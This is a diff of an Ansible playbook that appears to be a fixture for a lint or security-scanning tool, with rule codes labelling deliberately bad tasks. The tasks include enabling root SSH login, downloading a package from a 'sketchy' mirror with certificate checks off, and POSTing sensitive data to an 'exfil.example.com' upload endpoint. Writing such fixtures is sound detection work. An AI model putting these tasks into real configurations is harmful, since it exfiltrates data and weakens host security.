@@ -16,6 +16,7 @@
   become: true
   tasks:
     # L024/L028: task without name
+
     - name: Configure IOS banner
       cisco.ios.ios_banner:
         banner: motd
@@ -23,6 +24,7 @@
         state: present
       delegate_to: localhost
 # Second play: also no name (L003 again). L040 (tabs) is in playbook-l040-tabs.yml.
+
 - hosts: dbservers
   tasks:
     - name: Configure database
@@ -30,6 +32,7 @@
         # R109: key/config change
         cmd: mysql -e "CREATE DATABASE app"
       changed_when: false
+
     - name: Modify SSH config
       ansible.builtin.lineinfile:
         path: /etc/ssh/sshd_config
@@ -37,33 +40,38 @@
         line: PermitRootLogin yes
         mode: "0644"
       become: true # noqa: R108
-            # R114: file change
+    # R114: file change
+
     - name: Overwrite system config
       ansible.builtin.template:
         src: templates/sysctl.conf.j2
         dest: /etc/sysctl.conf
         mode: "0644"
+        state: present
       become: true # noqa: R108
-            # R104: download from unauthorized source
+    # R104: download from unauthorized source
     - name: Download from sketchy mirror
       ansible.builtin.get_url:
         url: https://mirrors.sketchy.example.com/packages/db-tools.rpm
         dest: /tmp/db-tools.rpm
         validate_certs: false
         # R105: outbound transfer
+
     - name: Upload data externally
       ansible.builtin.uri:
         url: https://exfil.example.com/upload
         method: POST
         body: "{{ sensitive_data | default('') }}"
         body_format: json
-        # L036: include_vars without when/tags
-      when: sensitive_data is defined
+      # L036: include_vars without when/tags
+      when: sensitive_data is defined and sensitive_data | length > 0
+      # noqa: L039
     - name: Load extra vars
       ansible.builtin.include_vars:
         file: vars/extras.yml
         # R106: inbound transfer
-      when: extra_vars_needed is defined and extra_vars_needed
+      when: extra_vars_needed is defined and extra_vars_needed | default(false)
+      # noqa: L039
     - name: Fetch remote archive
       ansible.builtin.unarchive:
         src: https://releases.example.com/app-v2.tar.gz
@@ -71,6 +79,7 @@
         remote_src: true
         # L027: role without metadata
         mode: "0644"
+
     - name: Use the broken role
       ansible.builtin.include_role:
         name: broken_role
